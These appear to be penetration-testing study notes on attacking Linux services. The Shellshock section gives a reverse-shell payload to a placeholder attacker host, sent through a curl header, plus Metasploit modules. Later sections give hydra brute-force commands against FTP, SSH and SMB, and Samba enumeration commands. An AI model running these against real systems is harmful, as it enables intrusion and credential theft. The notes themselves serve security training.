# Table of contents

- [Frequently Exploited Linux Services](#1)
  - [What is Linux?](#1,1)
  - [Exploiting Shellshock (CVE-2014-6271)](#1.2)
  - [Exploiting FTP](#1.333)
  - [Exploiting SSH](#1.4)
  - [Exploting Samba](#1.5)
- [Linux Privilege Escalation]

<a id=1></a>
# Frequently Exploited Linux Services

<a id=1.1></a>
## What is Linux?

Linux is a free and open source kernel. It is better known as part of GNU/Linux distributions such as
Arch Linux, Debian, Centos, and more. It was developed in first instance by Linus Torvalds in 1991 and
later released as an open source project impulsed by the Free Software Foundation (FSF).

As mentioned previously, Linux is typically bundled with GNU which was first developed and impulsed by
Richard Stallman, founder of the GNU Foundation (GNU is Not Unix) and the Free Software Foundation.

Linux is mainly currently being developed in C under the GPLv2 license.

Linux has a variety of use cases, but its most commonly seen in servers. The type may vary of course, but
it ranges from web servers, DNS servers, mail servers and so on and so forth.

This services are the main attack vector threat actors will look for and try to exploit. Some of these
services are:

| Service           | What it does    | Commonly seen ports |
|------------------ | --------------- | ------------------- |
| httpd/apache      | Web services.   | 80, 443, 8080       |
| nginx             | Web services    | 80, 443, 8080       |
| mysql             | DBMS            | 3306                |
| ftp/vsftpd        | FTP services    | 21, 2211            |
| ssh               | Secure Shells   | 22, 2222, 22222     |
| samba             | CIFS service    | 445                 |
| telnet (uncommon) | Telnet          | 23                  |

<a id=1.2></a>
## Exploiting Shellshock (CVE-2014-6271)

Shellshock is the name given to a family of vulnerabilities that existed in Bash since the 1.3 release.
This vulnerability allows an attacker to execute arbitrary remote commands via Bash and consequently
gaining a remote shell access.

It was discovered on 12th of September 2014 and released to the public on the 24th of September 2014.

The vulnerability allows an attacker to make Bash mistakenly execute commands after a series of characters:
()\{:;\};.

In the context of remote exploitation, Apache web servers configured to use CGI scripts or shell scripts are also
vulnerable to this attack.

Common Gateway Interface (CGI) are scripts ran by Apache to execute arbitrary commands on a Linux server, after which
the output is displayed to the user.

In order to remotely exploit this vulnerability we have to find a vulnerable form that runs a shell script or a CGI
script in an Apache web server. Or we can try to find a RCE vulnerability in a webpage and try to communicate with Bash.

```bash
$ nmap -sV [TARGET] --script http-shellshock --script-args "http-shellshock.uri=/path/to/script.cgi"
# If vulnerable, you'll most probably have to fire up Burpsuite and configure the proxy to pass arbitrary
# HTTP headers to check whether we can to RCE.
# We can create a reverse shell with the following input (put it in a header!)
$ bash -i>& /dev/tcp/[ATTACKER_IP]/[ATTACKER_PORT] 0>&1 
# We can also exploit it manually using Curl.
$ curl -A "() { :; }; /bin/bash -i >& /dev/tcp/[ATTACKER_IP]/[ATTACKER_PORT] 0>&1" [TARGET]/script.cgi &
# I tried using setsid, but it didn't work :(
msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf5 > set RHOSTS [TARGET]
msf5 > set TARGETURI [TARGET_URI]
msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf5 > setg RHOSTS [TARGET]
msf5 > set TARGETURI [TARGET_URI]

```

<a id=1.3></a>
## Exploiting FTP

FTP is a protocol usually found in port 21. It's used for transferring files from one machine to another.

FTP authentication uses a username and password. Because of this, one of the attack vectors most commonly used
are bruteforce attacks.

In some cases, FTP servers may allow anonymous logins, which gives unauthenticated access to the FTP server.

```bash
# Check the FTP version and type. Nowadays the most common are vsftpd, proftpd and others.
$ hydra -L /path/to/users -P /path/to/passwords [TARGET] ftp
# You could use the ftp_login module in the MSF, but it's usually slower.
```

<a id=1.4></a>
## Exploiting SSH

Secure Shell (SSH) is a common protocol used for remote CLI administration of a system. It usually runs on ports
22 and sometimes in 222 or 2222. 

Given the fact that SSH uses (mainly) username and password to authenticate, bruteforce attacks are usually the
way to go. Let's not forget that a second authentication method exists: through PKI (Public Key Infrastructure).
We'd need a private key to log in a machine with no credentials needed.

```bash
$ hydra -L /path/to/users -P /path/to/passwords [TARGET] ssh {-t [TASKS]}
# Again, you could use the MSF modules ssh_login, but it is slower than Hydra.
```

<a id=1.5></a>
## Exploiting Samba

Samba is the open source implementation of the proprietary SMB protocol, aka CIFS.

It usually runs on port 445, but it can also be found in 137 to 139.

To exploit this service we can use the following tools: 

- nmap NSE scripts
- smbclient
- smbmap
- hydra
- crackmapexec
- smb modules for MSF

```bash
# First lets get some credentials.
$ hydra -L /path/to/users -P /path/to/passwords [TARGET] smb
# Change -L for -l if you already have a username at hand.
$ smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] {-x [COMMAND]} {-d [DOMAIN_NAME]} {-s [SHARE]}
$ smbclient -L "[USERNAME]" {-N [NO_PASSWORD!]} //[TARGET]/[TARGET_SHARE]
$ enum4linux -a [TARGET] -u "[USERNAME]" -p "[PASSWORD]" {-S {SHARES}} {-G {GROUP AND MEMBERS}}
```
